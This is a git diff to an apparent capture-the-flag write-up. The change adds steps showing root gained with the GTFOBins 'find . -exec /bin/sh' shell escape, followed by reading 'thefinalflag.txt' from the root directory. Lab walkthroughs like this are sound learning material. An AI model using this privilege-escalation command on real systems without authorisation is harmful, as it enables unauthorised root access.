@@ -78,13 +78,29 @@ Then I tried to change directory to root but its not worked , I dont have root p
 
 
 
-so in GTFOBins i find a script for gaining root accses 
-https://gtfobins.github.io/gtfobins/find/#shell
+so in GTFOBins website i find a script for gaining root accses { https://gtfobins.github.io/gtfobins/find/#shell }
 
 
-find . -exec /bin/sh \; -quit
+                  find . -exec /bin/sh \; -quit
 
 
 ![Screenshot from 2023-01-19 01-03-23](https://user-images.githubusercontent.com/108471951/213277047-d1614401-d5ef-4ba0-ba13-d89743d653c9.png)
+
+
+Now i got root privilege 
+
+![Screenshot from 2023-01-19 01-06-22](https://user-images.githubusercontent.com/108471951/213277800-001027a5-b2de-4b7c-a1bc-5642687e6332.png)
+
+cd root
+
+ls
+
+cat thefinalflag.txt
+
+Successfully found the flag in root directory.
+
+
+![Screenshot from 2023-01-19 00-47-37](https://user-images.githubusercontent.com/108471951/213278117-02bc05a5-4ab0-424e-a41e-df32a40c5bf4.png)
+
 
 
